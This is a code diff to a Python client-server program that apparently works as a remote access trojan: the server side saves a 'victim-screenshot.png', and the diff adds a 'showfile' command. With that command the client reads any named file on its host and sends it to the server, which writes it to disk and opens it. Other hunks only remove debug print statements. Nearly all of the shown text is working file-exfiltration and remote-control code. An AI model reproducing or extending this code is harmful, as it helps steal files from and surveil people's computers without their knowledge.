@@ -73,7 +73,6 @@ class Server():
             if self.ping_socket in read:
                 self.client_ping, self.addr_ping = self.ping_socket.accept()
                 self.client, self.addr = self.server_socket.accept()
-                print("1.Clients connected!")
 
                 root.configure(background='green')
 
@@ -112,7 +111,6 @@ class Server():
                     elif(int(time() - started_time)) > 5:
                         self.client_ping.close()
                         self.client.close()
-                        print("44.clients closed!")
                         self.client_ping = None
                         self.is_server_listening = True
                         self.is_client_connected = False
@@ -186,7 +184,23 @@ class Server():
                                     break
                             self.client.sendall(b'ok')
                         subprocess.run(['xdg-open', 'victim-screenshot.png'])
-                        
+
+                    elif self.output == "showfile--*#($)&":
+                        self.client.sendall(b'ok')
+                        data = self.client.recv(1024).decode()
+                        self.file_name, self.file_size = data.split('|')
+                        self.file_size = int(self.file_size)
+                        self.client.sendall(b'ok')
+
+                        with open(f"recv-{self.file_name}", 'wb') as file:
+                            while self.file_size > 0:
+                                data = self.client.recv(min(self.file_size, 4096))
+                                file.write(data)
+                                self.file_size -= len(data)
+                                if not data:
+                                    break
+                            self.client.sendall(b'ok')
+                        subprocess.run(['xdg-open', f"recv-{self.file_name}"])
 
                     else:
                         self.output_lines = self.output.split('\n')
@@ -230,7 +244,6 @@ class Client():
             try:
                 self.ping_socket.connect((ip_addr, int(port)))
                 self.client_socket.connect((ip_addr, (int(port)+1 )))
-                print("1.sockets connected")
 
                 self.is_connected_to_server = True
                 self.is_client_connecting = False
@@ -350,17 +363,28 @@ class Client():
                                 self.client_socket.send("couldn't take screenshot".encode())
 
                         elif self.command[0:8] == "showfile":
-                            self.file_name = self.command[9:]
-                            self.file_directory = f"{os.getcwd()}/{self.file_name}"
-                            try:
-                                with open(self.file_directory, 'rb') as file:
-                                    self.data = file.read()
-                            except:
-                                self.client_socket.send("couldn't open the file!".encode())
-                            try:
-                                self.client_socket.sendall(self.data)
-                            except:
-                                print("coudn't send the file!")
+                            self.client_socket.send("showfile--*#($)&".encode())
+                            self.client_socket.recv(1024)
+
+                            self.file_name = self.command[9:]        
+                            self.file_size = os.path.getsize(self.file_name)
+                            
+                            self.client_socket.send(f"{self.file_name}|{self.file_size}".encode())
+                            self.msg = self.client_socket.recv(1024)
+                            if self.msg == b'ok':
+                                try:
+                                    file = open(self.file_name, 'rb')
+                                    data = file.read()
+                                except:
+                                    self.client_socket.send("could not open the file!".encode())
+                                try:
+                                    self.client_socket.sendall(data)
+                                    self.client_socket.recv(1024)
+                                except:
+                                    self.client_socket.send("could not send data!".encode())
+                            else:
+                                raise Exception('client did not recieved file name and size')
+
                                 
                         else:
                             try:
